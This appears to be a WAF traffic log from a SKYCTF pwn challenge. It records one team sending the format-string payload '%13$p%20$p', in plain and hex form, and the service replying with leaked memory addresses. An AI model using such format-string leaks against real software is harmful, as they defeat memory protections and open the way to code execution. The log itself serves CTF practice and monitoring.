// Date: 2021-11-27 02:57:57
// SKYCTF PWN WAF
// Deved By I0gan
team_name: assault

user_name: dreamc


<-------------------- read ------------------>
%13$p%20$p

r_0 = "\x25\x31\x33\x24\x70\x25\x32\x30\x24\x70\x0a"

<-------------------- write ----------------->
0x7f45973ec8400x565005b14860
PV--+--

w_0 = "\x30\x78\x37\x66\x34\x35\x39\x37\x33\x65\x63\x38\x34\x30\x30\x78\x35\x36\x35\x30\x30\x35\x62\x31\x34\x38\x36\x30\x0a\x05\x50\x56\x2d\x2d\x2b\x2d\x2d\x0a"

<-------------------- read ------------------>
%13$p%20$p

r_1 = "\x25\x31\x33\x24\x70\x25\x32\x30\x24\x70\x0a"

<-------------------- write ----------------->
0x7f45973ec8400x565005b14860
PVlogger: chall env released
logger: sky_token_is_wrong

w_1 = "\x30\x78\x37\x66\x34\x35\x39\x37\x33\x65\x63\x38\x34\x30\x30\x78\x35\x36\x35\x30\x30\x35\x62\x31\x34\x38\x36\x30\x0a\x05\x50\x56"
